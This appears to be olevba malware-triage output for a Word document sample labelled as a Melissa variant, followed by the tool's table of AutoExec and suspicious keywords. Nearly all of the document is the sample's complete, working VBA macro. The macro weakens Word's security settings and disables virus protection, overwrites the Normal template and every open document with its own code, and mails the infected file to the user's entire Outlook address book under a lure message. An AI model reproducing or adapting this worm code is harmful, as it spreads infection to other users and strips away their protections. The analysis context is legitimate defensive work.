olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Melissa.bj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Melissa.cls 
in file: ./Virus.MSWord.Melissa.bj - OLE stream: 'Macros/VBA/Melissa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'Anti-Smyser'
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
End If
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
NTL = NT.CodeModule.CountOfLines
If NT.CodeModule.Lines(11, 1) <> "NTL = NT.CodeModule.CountOfLines" Then
    Set Sr = MacroContainer.VBProject.VBComponents.Item(1)
    SrL = Sr.CodeModule.CountOfLines
    If NTL > 0 Then NT.CodeModule.DeleteLines 1, NTL
    NT.CodeModule.InsertLines 1, Sr.CodeModule.Lines(1, SrL)
    NT.Name = "Melissa"
End If
If NormalTemplate.Saved = False Then NormalTemplate.Save
For k = 1 To Application.Documents.Count
    Set kD = Application.Documents.Item(k).VBProject.VBComponents.Item(1)
    kDL = kD.CodeModule.CountOfLines
    If kD.CodeModule.Lines(11, 1) <> "NTL = NT.CodeModule.CountOfLines" Then
        If kDL > 0 Then kD.CodeModule.DeleteLines 1, kDL
        kD.CodeModule.InsertLines 1, NT.CodeModule.Lines(1, NTL)
    End If
    kD.Name = "Melissa"
Next k
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Cruson") <> "I remembered our old fucking dog last night" Then
Dim OL, mapi, msg
Set OL = CreateObject("Outlook.Application")
Set mapi = OL.GetNameSpace("MAPI")
If OL = "Outlook" Then
mapi.Logon "profile", "password"
Set AB = mapi.AddressLists(0)
Set msg = OL.CreateItem(0)
For i = 1 To AB.AddressEntries.Count
    Peep = AB.AddressEntries(i)
    msg.Recipients.Add Peep
Next i
msg.Body = "I remembered something last night. It is very, very important document. Look in attachment."
msg.Subject = "From " & Application.UserName
msg.Attachments.Add ActiveDocument.FullName
msg.Send
Peep = ""
mapi.Logoff
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Cruson") = "I remembered our old fucking dog last night"
End If
End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

